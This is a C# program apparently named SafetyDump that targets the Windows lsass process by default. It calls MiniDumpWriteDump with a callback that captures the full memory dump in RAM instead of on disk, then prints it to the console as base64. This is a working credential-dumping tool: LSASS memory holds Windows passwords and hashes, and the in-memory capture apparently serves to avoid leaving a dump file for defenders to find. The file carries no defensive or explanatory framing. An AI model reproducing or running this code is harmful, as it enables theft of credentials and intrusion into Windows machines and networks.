using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace SafetyDump
{
    internal static class Program
    {
        
        private static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                var processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-]Exception: {e.Message}\n");
                    return;
                }
            }

            try
            {
                targetProcessId = (uint) targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception e)
            {
                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}): {e.Message}\n");
                return;
            }
            
            var byteArray = new byte[60 * 1024 * 1024];
            var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
            {
                var inputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_INPUT>(input);
                var outputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_OUTPUT>(output);
                switch (inputStruct.CallbackType)
                {
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                        outputStruct.status = Internals.HRESULT.S_FALSE;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                        var ioStruct = inputStruct.Io;
                        if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                        {
                           Array.Resize(ref byteArray, byteArray.Length * 2); 
                        }
                        Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                        outputStruct.status = Internals.HRESULT.S_OK;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    case Internals.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                        outputStruct.status = Internals.HRESULT.S_OK;
                        Marshal.StructureToPtr(outputStruct, output, true);
                        return true;
                    default:
                        return true;
                }
            });

            var callbackInfo = new Internals.MINIDUMP_CALLBACK_INFORMATION
            {
                CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
            };

            var size = Marshal.SizeOf(callbackInfo);
            var callbackInfoPtr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

            if (Internals.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero,(uint) 2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
            {
                Console.OutputEncoding = Encoding.UTF8;
                Console.Write(Convert.ToBase64String((byteArray)));
                return;
    
            }
            Console.WriteLine("[-] Dump failed");
            Console.WriteLine(Marshal.GetLastWin32Error());

        }
    
        private static void Main(string[] args)
        {

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("\n[-] Process is not 64-bit!\n");
                return;
            }

            if (args.Length == 0)
            {
                Minidump();
            }
            else
            {
                var pid = -1;
                try
                {
                    pid = Convert.ToInt32(args[0]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] Error converting argument ({args[0]}) to PID: {e.Message}");
                    return;
                }
                Minidump(pid);
            }
        }
    }
}